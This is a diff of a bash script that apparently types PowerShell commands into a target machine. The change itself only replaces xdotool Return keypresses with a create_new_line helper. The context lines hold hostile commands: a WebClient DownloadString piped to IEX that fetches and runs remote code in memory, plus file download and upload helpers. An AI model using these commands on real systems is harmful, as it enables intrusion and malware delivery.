@@ -10,7 +10,7 @@ webclient_download() {
     fi
 
     paste_command "(New-Object Net.WebClient).DownloadFileAsync('${url}','${location}')"
-    xdotool key Return
+    create_new_line
     sleep 3
 }
 
@@ -23,7 +23,7 @@ webclient_download_and_execute_in_memory() {
     fi
 
     paste_command "(New-Object Net.WebClient).DownloadString('${url}') | IEX"
-    xdotool key Return
+    create_new_line
     sleep 3
 }
 
@@ -37,7 +37,7 @@ invoke_request_download() {
     fi
 
     paste_command "Invoke-WebRequest ${url} -OutFile ${location}"
-    xdotool key Return
+    create_new_line
     sleep 3
 }
 
@@ -81,7 +81,7 @@ ps_webclient_upload_file() {
         FOLDER_NAME="${TARGET_PATH##*\\}"
 
         paste_command "New-Item -Path \"${PARENT_FOLDER}\" -Name \"${FOLDER_NAME}\" -ItemType \"directory\""
-        xdotool key Return
+        create_new_line
         sleep 0.8
     fi
 
@@ -135,7 +135,7 @@ ps_webclient_upload_file_and_execute_in_memory() {
         FOLDER_NAME="${TARGET_PATH##*\\}"
 
         paste_command "New-Item -Path \"${PARENT_FOLDER}\" -Name \"${FOLDER_NAME}\" -ItemType \"directory\""
-        xdotool key Return
+        create_new_line
         sleep 0.8
     fi
 
